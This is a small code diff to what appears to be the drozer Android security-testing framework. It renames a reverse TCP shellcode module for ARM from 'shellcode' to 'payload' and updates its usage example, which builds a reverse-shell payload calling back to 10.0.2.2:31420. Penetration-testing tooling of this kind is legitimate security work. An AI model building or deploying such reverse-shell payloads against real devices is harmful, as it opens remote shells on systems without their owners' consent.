@@ -13,13 +13,13 @@ class ARMEABI(Module, common.ShellCode):
     as the first line.
     """
     examples = """
-    $ drozer shellcode build shell.reverse_tcp.armeabi  --server 10.0.2.2:31420
-                                                        --format U
+    $ drozer payload build shell.reverse_tcp.armeabi  --server 10.0.2.2:31420
+                                                      --format U
     """
     author = "Tyrone (@mwrlabs)"
     date = "2013-06-18"
     license = "BSD (3 clause)"
-    module_type = "shellcode"
+    module_type = "payload"
     path = ["shell.reverse_tcp"]
     
     def generate(self, arguments):
